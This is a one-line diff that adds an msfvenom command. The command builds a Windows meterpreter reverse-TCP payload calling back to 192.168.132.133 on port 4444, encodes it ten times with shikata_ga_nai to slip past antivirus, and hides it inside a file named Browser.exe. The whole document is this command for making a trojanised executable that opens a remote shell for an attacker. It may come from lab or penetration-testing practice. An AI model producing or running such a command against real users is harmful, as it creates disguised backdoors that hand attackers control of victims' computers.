@@ -1,0 +1,1 @@
+msfvenom -a x86 --platform widows -p windows/meterpreter/reverse_tcp LHOST=192.168.132.133 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -x Browser.exe -f exe -o /root/project/Browser.exe
